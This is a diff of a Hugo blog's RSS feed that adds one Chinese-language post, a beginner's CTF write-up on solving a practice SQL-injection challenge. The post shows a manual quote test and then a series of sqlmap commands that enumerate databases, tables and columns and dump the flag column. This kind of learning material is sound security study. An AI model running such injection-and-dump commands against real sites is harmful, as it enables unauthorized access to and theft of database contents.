@@ -6,10 +6,31 @@
     <description>Recent content in Posts on (*´･д･)?</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sun, 25 Feb 2018 23:04:01 +0800</lastBuildDate>
+    <lastBuildDate>Sun, 01 Apr 2018 08:48:58 +0800</lastBuildDate>
     
 	<atom:link href="http://xrazor.org/post/index.xml" rel="self" type="application/rss+xml" />
     
+    
+    <item>
+      <title>[CTF_WEB_01]sqlmap实验——“这个看起来有点简单”</title>
+      <link>http://xrazor.org/post/ctf_web_01sqlmap%E5%AE%9E%E9%AA%8C%E8%BF%99%E4%B8%AA%E7%9C%8B%E8%B5%B7%E6%9D%A5%E6%9C%89%E7%82%B9%E7%AE%80%E5%8D%95/</link>
+      <pubDate>Sun, 01 Apr 2018 08:48:58 +0800</pubDate>
+      
+      <guid>http://xrazor.org/post/ctf_web_01sqlmap%E5%AE%9E%E9%AA%8C%E8%BF%99%E4%B8%AA%E7%9C%8B%E8%B5%B7%E6%9D%A5%E6%9C%89%E7%82%B9%E7%AE%80%E5%8D%95/</guid>
+      <description>从今天开始学习CTF, 主攻Web+Misc。
+不积跬步无以至千里，不积小流无以至江海。慢慢来，细细看，玩中学。
+今天先来学习一下sqlmap。
+题目 题目来源:实验吧
+题目:http://ctf5.shiyanbar.com/8/index.php?id=1
+解题 1.手工注入测试 http://ctf5.shiyanbar.com/8/index.php?id=1&#39;  在末尾添加单引号：id=1&amp;rsquo;
+这样如果报错则可初步判断存在注入点。
+2.上sqlmap扫描 sqlmap -u &amp;quot;http://ctf5.shiyanbar.com/8/index.php?id=1&amp;quot; --dbs  很快就扫出了3个DB的名字，看着这个my_db嫌疑比较大，接下来我们就对它下手。
+3.获取tables sqlmap -u &amp;quot;http://ctf5.shiyanbar.com/8/index.php?id=1&amp;quot; -D my_db --tables  马上拿到了table名,显然我们要找的是这个thiskey,别问我怎么知道的:D
+4.获取字段 sqlmap -u &amp;quot;http://ctf5.shiyanbar.com/8/index.php?id=1&amp;quot; -D my_db -T thiskey --columns  这样我们就拿到了column, 下一步就是猜解字段内容
+5.猜解内容 sqlmap -u &amp;quot;http://ctf5.shiyanbar.com/8/index.php?id=1&amp;quot; -D my_db -T thiskey -C k0y --dump  这样我们就拿到了第一个flag.
+虽然简单，却也大概了解了sqlmap的能力和用法。
+明天见。</description>
+    </item>
     
     <item>
       <title>Hihocoder1696折线中点</title>
